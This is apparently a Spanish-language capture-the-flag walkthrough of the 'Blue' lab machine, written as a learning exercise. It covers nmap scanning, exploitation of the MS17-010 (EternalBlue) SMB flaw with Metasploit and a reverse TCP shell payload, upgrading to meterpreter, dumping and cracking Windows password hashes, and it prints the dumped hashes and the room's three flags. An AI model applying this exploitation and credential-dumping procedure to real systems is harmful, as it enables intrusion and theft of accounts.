# Blue

Esta m치quina nos *gu칤a* con las preguntas que nos hacen. Ha sido f치cil de completar, quitando algunos errores que ten칤a la m치quina(hab칤a que reiniciar y empezar de 0).
Para esta documentaci칩n, me voy a limitar a traducir y desarrollar las preguntas que nos hacen con una captura y una oraci칩n explicativa.

- Escanea la m치quina.
Como no nos especifican que daros quieren que saquemos, haga un escaneo b치sico de los 1000 puertos m치s habituales.

![alt text](img/image.png)
> nmap {ip_host}

Este escaneo nos ha dado 4 puertos que podr칤amos mirar, y el resto con servicios desconocidos.

- 쮺u치ntos puertos abiertos hay por debajo del 1000?
Podemos usar el comando anterior, pero para asegurarnos vamos a utilizar un rango de puertos.

![alt text](img/image-1.png)
> nmap -p 1-1000 {ip_host}

Nos aseguramos, y la respuesta es 3.

- 쮸 qu칠 es vulnerable esta m치quina?
Para ver esto, vamos a utilizar un script de nmap que busca vulnerabilidades en los servicios. Uso el mismo rango de antes porque entiendo que las preguntas est치n enlazadas.

![alt text](img/image-2.png)
> nmap --script vuln -p 1-1000 {ip_host}

El escaneo nos chiva que existe una vulnerabilidad en el servicio SMBv1 llamada **ms17-010**

- Inicia Metasploit

![alt text](img/image-3.png)
> sudo msfconsole 游녨

- Busca la vulnerabilidad. 쮺u치l es la ruta completa del c칩digo?
Buscamos la vulnerabilidad anterior en la base de datos de Metasploit

![alt text](img/image-4.png)
> search ms17-010
> exploit/windows/smb/ms17_010_eternalblue

Esto nos dar치 varias entradas, pero el t칤tulo de la *Room* nos dice cual es la que nos interesa, en este caso es la primera(la 0 en idioma inform치tico).

- Muestra las opciones y configura la que tiene un valor obligatorio.
Usamos el modulo 0 y mostramos sus opciones, en este caso la 칰nica obligatoria es RHOST.

![alt text](img/image-5.png)

Establecemos el valor de RHOST, y cambio el de LHOST, ya que estaba pillando otra IP.

![alt text](img/image-6.png)

Antes de iniciar el exploit, los creadores nos recomiendan establecer el siguiente payload.

![alt text](img/image-7.png)
> set payload windows/x64/shell/reverse_tcp

Lo establecemos e iniciamos el exploit con *run*.

![alt text](img/image-8.png)

Ya estar칤amos dentro del sistema de Windows, pero esta terminal no nos gusta, vamos a mejorarala.

![alt text](img/image-9.png)

Paramos la sesi칩n con CTRL + Z.

- Investigue en l칤nea c칩mo convertir un shell a meterpreter shell en metasploit. 쮺u치l es el nombre del m칩dulo de publicaci칩n que usaremos?

Internet = ChatGPT

![alt text](img/image-10.png)

- Selecciona este m칩dulo y muestra las opciones obligatorias de configurar.

![alt text](img/image-11.png)

La 칰nica opci칩n obligatoria es *SESSION*, la sesi칩n que paramos antes.

- Establece la opci칩n necesaria, necesitaras listar las sesiones.

![alt text](img/image-12.png)

Listamos las sesiones con sessions -l y, aunque no hace falta, establezco el LHOST por si aca.

- Inicia el exploit.
Lo iniciamos y lo dejamos cargar, se lleva su tiempo, pero si pone session 2 opened, ya puedes darle a *enter*.

![alt text](img/image-13.png)

Yo esper칠 un rato m치s, creyendo que iba a parar/pasar algo, pero no, hay que darle al enter.

![alt text](img/image-14.png)

- Una vez que se complete la conversi칩n de la shell, selecci칩nala y 칰sala.

    Est치s 2 preguntas las uno en la im치gen de abajo.

- Lista los procesos usando el comando *ps*.

![alt text](img/image-15.png)

*Ahora se viene una parte que no entend칤 muy bien*

- Encuentra un proceso al final de la lista que est칠 siendo ejecutado por NT AUTHORITY\SYSTEM
De toda la lista de antes, eleg칤 uno al azar, no s칠 si tuve suerte, si todos sirven...

![alt text](img/image-16.png)

Y, usando ese proceso, podemos sacar los hashes de los usuarios de la m치quina. 쮺칩mo? Si

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d::

Le pasamos un john the reaper al hash de Jon y sacamos su contrase침a.

![alt text](img/image-17.png)

- Encuentra las flags

Esta parte es muy simple, sobre todo teniendo en cuenta los permisos que tenemos ahora, y las pistas que nos dan.

- Flag1? Esta flag se puede encontrar en la ra칤z del sistema.

![alt text](img/image-18.png)
> flag{access_the_machine}

- Flag2? Esta flag se encuentra donde Windows guarda las contrase침as de los usuarios.

![alt text](img/image-19.png)
> flag{sam_database_elevated_access}

- Flag3? Esta flag est치 entre los archivos de Jon.

![alt text](img/image-20.png)
> flag{admin_documents_can_be_valuable}

## USER? No

No s칠 si al tener root, podemos iniciar sesi칩n con un usuario.

![alt text](img/image-22.png)

## ROOT? Si

![alt text](img/image-21.png)